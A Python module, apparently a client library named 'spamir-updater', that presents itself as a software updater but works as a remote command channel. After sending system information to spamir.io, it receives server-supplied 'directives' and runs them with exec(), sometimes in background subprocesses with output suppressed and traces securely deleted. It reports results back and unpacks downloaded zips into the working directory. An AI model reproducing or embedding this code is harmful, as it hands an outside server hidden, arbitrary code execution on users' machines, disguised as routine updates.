import os
import json
import base64
import zipfile
import sys
import time
import threading
import traceback
import subprocess
from pathlib import Path
from io import BytesIO

from .network import NetworkHandler
from .encryption import EncryptionHandler
from .self_updater import SelfUpdater
from .utils import (
    load_version_from_config,
    save_version_to_config,
    get_system_info,
    generate_instance_signature,
    log_to_file,
    create_temp_workspace,
    cleanup_workspace,
    run_isolated_process,
    read_process_output
)

SHARED_AUTH_TOKEN = "0leCsb1QQNcswtnuOZdQ8zlqgYKSz0RMd9ZKMSCA76A="
ORIGIN_ENDPOINT_BASE = "https://spamir.io"
CORE_HANDLER_VERSION = "1.0"
GLOBAL_ENCRYPTION_ITERATIONS = 100000
API_BASE_PATH_SEGMENT = "/endpoint/v1/updater/"


class UpdaterClient:
    def __init__(self, options=None):
        if options is None:
            options = {}
        if 'product_identifier' not in options:
            raise ValueError('product_identifier is required')
        self.product_identifier = options['product_identifier']
        self.current_version = options.get('current_version')
        self.auth_token = options.get('auth_token', SHARED_AUTH_TOKEN)
        self.endpoint_base = options.get('endpoint_base', ORIGIN_ENDPOINT_BASE)
        self.handler_version = options.get('handler_version', CORE_HANDLER_VERSION)
        self.encryption_iterations = options.get('encryption_iterations', GLOBAL_ENCRYPTION_ITERATIONS)
        self.default_background_execution = options.get('background_execution', True)
        self.instance_marker = generate_instance_signature(self.auth_token)
        self.system_info = get_system_info()
        self.encryption = EncryptionHandler(self.auth_token, self.encryption_iterations)
        self.network = NetworkHandler(
            self.endpoint_base,
            API_BASE_PATH_SEGMENT,
            self.handler_version,
            self.instance_marker
        )
        self.self_updater = SelfUpdater()
        self.session_token = None
        self.client_nonce = None
        self.directive_results = []
        self.is_running = False
        self._active_processes = {}
        self._process_outcomes = {}
        self._workspace_cleanup = threading.Lock()
    
    async def initialize_version(self):
        if not self.current_version:
            config_version = load_version_from_config()
            if config_version:
                self.current_version = config_version
            else:
                self.current_version = '1.0'
    
    async def establish_control_channel(self):
        self.client_nonce = self.encryption.generate_nonce()
        
        payload = {
            'client_version': self.instance_marker,
            'current_version': self.current_version,
            'product_identifier': self.product_identifier,
            'system_info': self.system_info,
            'client_nonce_b64': self.client_nonce
        }
        
        payload_json = json.dumps(payload, separators=(',', ':'))
        signature = self.encryption.sign_data(payload_json)
        
        response = self.network.send_request(
            'sync_check',
            payload_json,
            signature,
            True
        )
        
        if not response:
            log_to_file('Failed to establish control channel', 'ERROR')
            return None
        server_nonce = response.get('server_nonce')
        self.session_token = response.get('session_token')

        if server_nonce and self.session_token:
            success = self.encryption.negotiate_secure_layer(self.client_nonce, server_nonce)
            if not success:
                log_to_file('Failed to negotiate secure layer', 'ERROR')
                self.session_token = None
                return None
        
        return response
    
    async def download_package(self, asset_details):
        if not self.session_token:
            log_to_file('No session token for asset download', 'ERROR')
            return None
        
        download_token = asset_details.get('download_token')
        if not download_token:
            log_to_file('No download token in asset details', 'ERROR')
            return None
        
        payload = {
            'version': asset_details['version'],
            'current_version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier,
            'session_token': self.session_token,
            'download_token': download_token
        }
        hmac_payload = {
            'version': asset_details['version'],
            'current_version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier,
            'download_token': download_token
        }
        hmac_json = json.dumps(hmac_payload, sort_keys=True, separators=(',', ':'))
        signature = self.encryption.sign_data(hmac_json)
        
        response = self.network.download_asset(payload, signature)
        if not response:
            log_to_file('Asset download failed: No response from server', 'ERROR')
            return None
        
        if 'package' not in response:
            log_to_file(f"Asset download failed: Missing package field. Response keys: {', '.join(response.keys())}", 'ERROR')
            return None
        
        if 'hash' not in response:
            log_to_file(f"Asset download failed: Missing hash field. Response keys: {', '.join(response.keys())}", 'ERROR')
            return None
        
        is_encrypted = response.get('encrypted', False)
        if is_encrypted:
            package_data = self.encryption.decrypt_payload(response['package'])
            if not package_data:
                log_to_file('Failed to decrypt package', 'ERROR')
                return None
        else:
            package_data = base64.b64decode(response['package'])
        computed_hash = self.encryption.compute_hash(package_data)
        if computed_hash != response['hash']:
            log_to_file(f"Package hash mismatch:", 'ERROR')
            log_to_file(f"  Expected: {response['hash']}", 'ERROR')
            log_to_file(f"  Computed: {computed_hash}", 'ERROR')
            log_to_file(f"  Package size: {len(package_data)} bytes", 'ERROR')
            log_to_file(f"  Is encrypted: {is_encrypted}", 'ERROR')
            return None
        
        log_to_file(f"Package downloaded successfully: {len(package_data)} bytes, hash verified", 'INFO')
        
        return package_data
    
    async def extract_package(self, package_data, new_version):
        if not package_data[:4] == b'PK\x03\x04':
            return 'failed_bad_format'
        
        try:
            zip_buffer = BytesIO(package_data)
            with zipfile.ZipFile(zip_buffer, 'r') as zip_file:
                extract_path = os.getcwd()
                zip_file.extractall(extract_path)
            self.current_version = new_version
            
            log_to_file(f"Package extracted successfully, version updated to {new_version}")
            return 'success'
        except Exception as e:
            log_to_file(f"Extraction failed: {e}", 'ERROR')
            return 'failed_extraction'
    
    async def process_directive(self, download_token, directive_name='Directive', background=False):
        if not self.session_token:
            return {'status': 'error', 'message': 'No session token'}
        
        payload = {
            'download_token': download_token,
            'version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier,
            'session_token': self.session_token
        }
        
        hmac_payload = {
            'download_token': download_token,
            'version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier
        }
        hmac_json = json.dumps(hmac_payload, sort_keys=True, separators=(',', ':'))
        signature = self.encryption.sign_data(hmac_json)
        
        response = self.network.send_request(
            'fetch_directive',
            payload,
            signature,
            False
        )
        
        if not response or 'code' not in response or 'hmac' not in response:
            return {'status': 'error', 'message': 'Invalid directive response'}
        
        is_encrypted = response.get('encrypted', False)
        
        if is_encrypted:
            decrypted = self.encryption.decrypt_payload(response['code'])
            if not decrypted:
                return {'status': 'error', 'message': 'Failed to decrypt directive'}
            directive_code = decrypted.decode('utf-8')
        else:
            directive_code = base64.b64decode(response['code']).decode('utf-8')
        if not self.encryption.verify_signature(directive_code, response['hmac']):
            return {'status': 'error', 'message': 'Directive HMAC verification failed'}
        try:
            service_params = {
                'instance_marker': self.instance_marker,
                'asset_version': self.current_version
            }

            if background:
                result = self._run_isolated_task(
                    directive_code,
                    service_params,
                    directive_name,
                    timeout=300,
                    wait_for_completion=True
                )
                return result
            else:
                result = {'status': 'error', 'message': 'Request could not be processed.'}

                try:
                    directive_namespace = {
                        '__builtins__': __builtins__,
                        '__name__': '__main__',
                    }

                    exec(directive_code, directive_namespace)

                    if 'main' in directive_namespace and callable(directive_namespace['main']):
                        module_response = directive_namespace['main'](service_params)

                        if isinstance(module_response, dict):
                            result = module_response
                        else:
                            result = {
                                'status': 'ok',
                                'message': 'Request completed.',
                                'return_value': str(module_response)
                            }
                    else:
                        result = {'status': 'error', 'message': "Module 'main' interface not found."}

                except Exception as exec_error:
                    log_to_file(f"Directive execution error: {exec_error}", 'ERROR')
                    result = {
                        'status': 'error',
                        'message': 'Directive execution failed',
                        'error': str(exec_error)
                    }

                return result
            
        except Exception as e:
            log_to_file(f"Directive processing error: {e}", 'ERROR')
            return {
                'status': 'error',
                'message': 'Failed to process directive',
                'error': str(e)
            }
    
    async def report_directive_outcome(self, directive_name, directive_version, result_dict, options=None):
        if options is None:
            options = {}
        
        if not self.session_token:
            return False
        is_queued = 'queued_id' in options
        if is_queued:
            payload = {
                'instance_marker': self.instance_marker,
                'product_identifier': self.product_identifier,
                'queued_id': str(options['queued_id']),
                'directive_name': directive_name,
                'directive_version': directive_version,
                'session_token': self.session_token,
                'result_is_encrypted': 'False'
            }
        else:
            payload = {
                'client_version': self.instance_marker,
                'product_identifier': self.product_identifier,
                'directive_name': directive_name,
                'directive_version': directive_version,
                'session_token': self.session_token,
                'result_is_encrypted': 'False'
            }
        if not is_queued and options.get('is_immediate') and 'script_id' in options:
            payload['script_id'] = str(options['script_id'])
            payload['is_recurring'] = '1' if options.get('is_recurring') else '0'
        
        result_json = json.dumps(result_dict)
        final_payload = result_json
        if self.encryption.current_channel_key:
            encrypted = self.encryption.encrypt_payload(result_json.encode('utf-8'))
            if encrypted:
                final_payload = encrypted
                payload['result_is_encrypted'] = 'True'
        if is_queued:
            payload['outcome_data'] = final_payload
        else:
            payload['execution_result'] = final_payload
        hmac_json = json.dumps(payload, sort_keys=True, separators=(',', ':'))
        signature = self.encryption.sign_data(hmac_json)
        
        action_key = 'update_directive_status' if 'queued_id' in options else 'report_outcome'
        response = self.network.send_request(
            action_key,
            payload,
            signature,
            False
        )
        
        if response and 'message' in response:
            pass
        
        return response and response.get('success', False)
    
    async def perform_update_cycle(self):
        self.directive_results = []

        sync_response = await self.establish_control_channel()
        
        if not sync_response:
            return {
                'status': 'sync_failed',
                'message': 'Failed to establish control channel',
                'version': self.current_version
            }
        
        overall_status = 'no_update'
        new_version_details = None

        update_package = sync_response.get('update_package')
        
        if update_package and update_package.get('new_version'):
            offered_version = update_package['new_version']
            log_to_file(f"Update available: {self.current_version} -> {offered_version}", 'INFO')
            
            if offered_version != self.current_version:
                overall_status = 'update_started'
                new_version_details = offered_version
                asset_details = dict(update_package)
                asset_details['version'] = offered_version
                if 'new_version' in asset_details:
                    del asset_details['new_version']
                
                log_to_file(f"Asset details prepared. Has download_token: {bool(asset_details.get('download_token'))}", 'INFO')
                package_data = await self.download_package(asset_details)
                
                if package_data:
                    extract_result = await self.extract_package(package_data, offered_version)
                    
                    if extract_result == 'success':
                        overall_status = 'update_success'
                        save_version_to_config(offered_version)
                    else:
                        overall_status = 'update_failed'
                else:
                    overall_status = 'update_failed'
                    log_to_file('Package download or extraction failed', 'ERROR')
            else:
                log_to_file(f"Version {offered_version} is same as current version", 'INFO')
        else:
            if not update_package:
                pass
            elif not update_package.get('new_version'):
                log_to_file('Update package missing new_version field', 'WARNING')
        immediate_directive = sync_response.get('immediate_directive')
        if immediate_directive and immediate_directive.get('download_token'):
            result = await self.process_directive(
                immediate_directive['download_token'],
                immediate_directive.get('directive_name', 'UnknownDirective'),
                background=self.default_background_execution
            )
            self.directive_results.append({
                'type': 'immediate',
                'name': immediate_directive.get('directive_name', 'UnknownDirective'),
                'version': immediate_directive.get('version', 'N/A'),
                'result': result
            })
            
            await self.report_directive_outcome(
                immediate_directive.get('directive_name', 'UnknownDirective'),
                immediate_directive.get('version', 'N/A'),
                result,
                {
                    'is_immediate': True,
                    'script_id': immediate_directive.get('script_id'),
                    'is_recurring': immediate_directive.get('is_recurring', False)
                }
            )
            
            if overall_status == 'no_update':
                overall_status = 'directives_processed'
        queued_directives = sync_response.get('queued_directives', [])
        for directive in queued_directives:
            if directive.get('download_token'):
                result = await self.process_directive(
                    directive['download_token'],
                    directive.get('directive_name', 'UnknownDirective'),
                    background=self.default_background_execution
                )
                self.directive_results.append({
                    'type': 'queued',
                    'name': directive.get('directive_name', 'UnknownDirective'),
                    'version': directive.get('version', 'N/A'),
                    'result': result
                })
                
                await self.report_directive_outcome(
                    directive.get('directive_name', 'UnknownDirective'),
                    directive.get('version', 'N/A'),
                    result,
                    {
                        'queued_id': directive['queued_id']
                    }
                )
                
                if overall_status == 'no_update':
                    overall_status = 'directives_processed'
        
        return {
            'status': overall_status,
            'message': f"Cycle completed. Final version: {self.current_version}",
            'version': self.current_version,
            'new_version': self.current_version if overall_status == 'update_success' else new_version_details
        }
    
    async def check_for_updates(self):
        if self.is_running:
            return {
                'status': 'error',
                'message': 'Update check already in progress',
                'version': self.current_version or '1.0'
            }
        
        self.is_running = True
        
        try:
            await self.initialize_version()
            result = await self.perform_update_cycle()
            if result['status'] == 'update_success':
                response = {
                    'status': 'update_available',
                    'message': f"Update completed successfully to version {result['version']}",
                    'version': self.current_version,
                    'new_version': result['version']
                }
            elif result['status'] == 'no_update':
                response = {
                    'status': 'no_update',
                    'message': 'Application is up to date',
                    'version': self.current_version
                }
                if self.directive_results:
                    response['directiveResults'] = self.directive_results
            elif result['status'] == 'directives_processed':
                response = {
                    'status': 'no_update',
                    'message': 'Directives processed. Update cycle completed.',
                    'version': self.current_version,
                    'directiveResults': self.directive_results
                }
            elif result['status'] == 'sync_failed':
                response = {
                    'status': 'sync_failed',
                    'message': 'Failed to connect to update server',
                    'version': self.current_version
                }
            else:
                response = {
                    'status': 'error',
                    'message': result.get('message', 'Update check failed'),
                    'version': self.current_version
                }
            
            return response
            
        except Exception as e:
            import traceback
            log_to_file(f"Update check error: {e}", 'ERROR')
            if self.instance_marker and self.product_identifier:
                error_data = {
                    'instance_marker': self.instance_marker,
                    'product_identifier': self.product_identifier,
                    'agent_version': self.handler_version,
                    'error_message': str(e),
                    'stack_trace': traceback.format_exc()
                }
                
                error_json = json.dumps(error_data, separators=(',', ':'))
                signature = self.encryption.sign_data(error_json)
                
                await self.network.report_error(error_data, signature)
            
            return {
                'status': 'error',
                'message': f"Update check failed: {e}",
                'version': self.current_version or '1.0'
            }
        finally:
            self.is_running = False

    async def check_self_update(self):
        try:
            update_info = self.self_updater.check_for_update()
            return {
                'status': 'success',
                'module_name': 'spamir-updater',
                'current_version': update_info['current_version'],
                'latest_version': update_info['latest_version'],
                'update_available': update_info['update_available'],
                'error': update_info.get('error')
            }
        except Exception as e:
            log_to_file(f"Self-update check failed: {e}", 'ERROR')
            return {
                'status': 'error',
                'message': f"Self-update check failed: {e}",
                'module_name': 'spamir-updater'
            }

    async def perform_self_update(self, force=False):
        try:
            result = self.self_updater.perform_self_update(force=force)

            if result['success']:
                log_to_file(f"Self-update successful: {result['message']}", 'INFO')
                return {
                    'status': 'success',
                    'message': result['message'],
                    'module_name': 'spamir-updater',
                    'previous_version': result['current_version'],
                    'new_version': result['target_version'],
                    'restart_required': result.get('restart_required', False)
                }
            else:
                log_to_file(f"Self-update failed: {result['message']}", 'ERROR')
                return {
                    'status': 'error',
                    'message': result['message'],
                    'module_name': 'spamir-updater',
                    'current_version': result['current_version']
                }

        except Exception as e:
            log_to_file(f"Self-update error: {e}", 'ERROR')
            return {
                'status': 'error',
                'message': f"Self-update failed: {e}",
                'module_name': 'spamir-updater'
            }

    async def check_for_updates_with_self_update(self, auto_self_update=False):
        self_update_info = await self.check_self_update()
        if auto_self_update and self_update_info.get('update_available'):
            self_update_result = await self.perform_self_update()
            if self_update_result['status'] == 'success':
                return {
                    'status': 'self_update_success',
                    'message': 'spamir-updater module was updated successfully. Please restart the application.',
                    'self_update': self_update_result,
                    'restart_required': True
                }
        app_update_result = await self.check_for_updates()
        return {
            'status': app_update_result['status'],
            'message': app_update_result['message'],
            'version': app_update_result.get('version'),
            'new_version': app_update_result.get('new_version'),
            'directiveResults': app_update_result.get('directiveResults'),
            'self_update_info': self_update_info
        }

    def get_background_process_status(self, process_id):
        return self.get_task_status(process_id)

    def get_background_process_result(self, process_id):
        return self.get_task_result(process_id)

    def list_background_processes(self):
        return self.list_active_tasks()

    def kill_background_process(self, process_id):
        return self.terminate_task(process_id)

    def cleanup_old_background_results(self, max_age_seconds=3600):
        return self.cleanup_task_history(max_age_seconds)

    async def process_directive_background(self, download_token, directive_name='Directive'):
        return await self.process_directive(download_token, directive_name, background=True)

    def _generate_runtime_wrapper(self, task_file, params_file, result_file):
        return f'''
import json
import sys
import traceback
import os
import subprocess

class SuppressOutput:
    def __enter__(self):
        self._original_stdout = sys.stdout
        self._original_stderr = sys.stderr
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stdout.close()
        sys.stderr.close()
        sys.stdout = self._original_stdout
        sys.stderr = self._original_stderr

def main():
    try:
        with open('{params_file}', 'r') as f:
            service_params = json.load(f)

        result = {{'status': 'error', 'message': 'Request could not be processed.'}}

        task_namespace = {{
            '__builtins__': __builtins__,
            '__name__': '__main__',
            'subprocess': subprocess,
        }}

        with open('{task_file}', 'r') as f:
            task_code = f.read()

        with SuppressOutput():
            exec(task_code, task_namespace)

        if 'main' in task_namespace and callable(task_namespace['main']):
            with SuppressOutput():
                module_response = task_namespace['main'](service_params)

            if isinstance(module_response, dict):
                result = module_response
            else:
                result = {{
                    'status': 'ok',
                    'message': 'Request completed.',
                    'return_value': str(module_response)
                }}
        else:
            result = {{'status': 'error', 'message': "Module 'main' interface not found."}}

    except Exception as e:
        result = {{
            'status': 'error',
            'message': 'Task execution failed',
            'error': str(e),
            'traceback': traceback.format_exc()
        }}

    try:
        with open('{result_file}', 'w') as f:
            json.dump(result, f, indent=2)
    except Exception:
        pass

    return result.get('status', 'error') == 'ok'

if __name__ == '__main__':
    success = main()
    sys.exit(0 if success else 1)
'''

    def _run_isolated_task(self, task_code, service_params, task_name='Task', timeout=300, wait_for_completion=False):
        try:
            workspace = create_temp_workspace()
            task_file = os.path.join(workspace, 't.py')
            params_file = os.path.join(workspace, 'p.json')
            result_file = os.path.join(workspace, 'r.json')

            with open(task_file, 'w', encoding='utf-8') as f:
                f.write(task_code)

            with open(params_file, 'w', encoding='utf-8') as f:
                json.dump(service_params, f)

            wrapper_script = self._generate_runtime_wrapper(task_file, params_file, result_file)
            wrapper_file = os.path.join(workspace, 'w.py')

            with open(wrapper_file, 'w', encoding='utf-8') as f:
                f.write(wrapper_script)

            process, stdout_file, stderr_file = run_isolated_process(wrapper_file, timeout, workspace)

            process_id = f"{int(time.time())}_{process.pid}"

            with self._workspace_cleanup:
                self._active_processes[process_id] = {
                    'process': process,
                    'workspace': workspace,
                    'result_file': result_file,
                    'stdout_file': stdout_file,
                    'stderr_file': stderr_file,
                    'task_name': task_name,
                    'start_time': time.time(),
                    'timeout': timeout
                }

            monitor_thread = threading.Thread(
                target=self._monitor_subprocess,
                args=(process_id,),
                daemon=True
            )
            monitor_thread.start()


            if wait_for_completion:
                return self._wait_for_task(process_id, timeout)
            else:
                return {
                    'status': 'started',
                    'process_id': process_id,
                    'message': f'{task_name} started',
                    'task_name': task_name
                }

        except Exception as e:
            return {
                'status': 'error',
                'message': f'Failed to start task: {e}',
                'task_name': task_name
            }

    def _wait_for_task(self, process_id, timeout):
        start_time = time.time()
        poll_interval = 0.5

        while time.time() - start_time < timeout:
            with self._workspace_cleanup:
                if process_id in self._process_outcomes:
                    result = self._process_outcomes[process_id].copy()
                    del self._process_outcomes[process_id]
                    return result

                if process_id not in self._active_processes:
                    return {
                        'status': 'error',
                        'message': 'Task disappeared without result',
                        'process_id': process_id
                    }

            time.sleep(poll_interval)

        self.terminate_task(process_id)
        return {
            'status': 'error',
            'message': f'Task timed out after {timeout} seconds',
            'process_id': process_id
        }

    def _monitor_subprocess(self, process_id):
        try:
            with self._workspace_cleanup:
                if process_id not in self._active_processes:
                    return

                process_info = self._active_processes[process_id]
                process = process_info['process']
                timeout = process_info['timeout']

            try:
                process.wait(timeout=timeout)
                return_code = process.returncode
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
                return_code = -1

            stdout = read_process_output(process_info['stdout_file'])
            stderr = read_process_output(process_info['stderr_file'])

            result = self._read_task_result(process_info['result_file'], return_code, stdout, stderr)

            from .utils import secure_delete
            secure_delete(process_info['stdout_file'])
            secure_delete(process_info['stderr_file'])

            with self._workspace_cleanup:
                self._process_outcomes[process_id] = result
                self._cleanup_task(process_id)


        except Exception as e:
            with self._workspace_cleanup:
                self._process_outcomes[process_id] = {
                    'status': 'error',
                    'message': f'Task monitoring failed: {e}',
                    'task_name': process_info.get('task_name', 'Unknown')
                }
                self._cleanup_task(process_id)

    def _read_task_result(self, result_file, return_code, stdout, stderr):
        result = None
        try:
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    result = json.load(f)
                    result['return_code'] = return_code
                from .utils import secure_delete
                secure_delete(result_file)
        except Exception:
            pass

        if result:
            return result

        return {
            'status': 'error' if return_code != 0 else 'unknown',
            'message': 'Task completed',
            'return_code': return_code
        }

    def _cleanup_task(self, process_id):
        if process_id in self._active_processes:
            process_info = self._active_processes[process_id]
            from .utils import sanitize_workspace, secure_delete

            if 'stdout_file' in process_info:
                secure_delete(process_info['stdout_file'])
            if 'stderr_file' in process_info:
                secure_delete(process_info['stderr_file'])
            if 'result_file' in process_info:
                secure_delete(process_info['result_file'])

            sanitize_workspace(process_info['workspace'])
            del self._active_processes[process_id]

            if process_id in self._process_outcomes:
                del self._process_outcomes[process_id]

    def get_task_status(self, process_id):
        with self._workspace_cleanup:
            if process_id in self._active_processes:
                process_info = self._active_processes[process_id]
                elapsed_time = time.time() - process_info['start_time']

                return {
                    'status': 'running',
                    'process_id': process_id,
                    'task_name': process_info['task_name'],
                    'elapsed_time': elapsed_time,
                    'timeout': process_info['timeout']
                }

            if process_id in self._process_outcomes:
                result = self._process_outcomes[process_id].copy()
                result['status_type'] = 'completed'
                return result

            return {
                'status': 'not_found',
                'process_id': process_id,
                'message': 'Task not found'
            }

    def get_task_result(self, process_id):
        with self._workspace_cleanup:
            if process_id in self._process_outcomes:
                result = self._process_outcomes[process_id].copy()
                del self._process_outcomes[process_id]
                return result
            return None

    def list_active_tasks(self):
        with self._workspace_cleanup:
            running = []
            for process_id, process_info in self._active_processes.items():
                elapsed_time = time.time() - process_info['start_time']
                running.append({
                    'process_id': process_id,
                    'task_name': process_info['task_name'],
                    'elapsed_time': elapsed_time,
                    'timeout': process_info['timeout']
                })
            return running

    def terminate_task(self, process_id):
        with self._workspace_cleanup:
            if process_id in self._active_processes:
                process_info = self._active_processes[process_id]
                try:
                    process_info['process'].kill()
                    return True
                except Exception:
                    return False
            return False

    def cleanup_task_history(self, max_age_seconds=3600):
        current_time = time.time()
        with self._workspace_cleanup:
            to_remove = []
            for process_id, result in self._process_outcomes.items():
                if 'cleanup_timestamp' not in result:
                    result['cleanup_timestamp'] = current_time

                if current_time - result['cleanup_timestamp'] > max_age_seconds:
                    to_remove.append(process_id)

            for process_id in to_remove:
                del self._process_outcomes[process_id]

            return len(to_remove)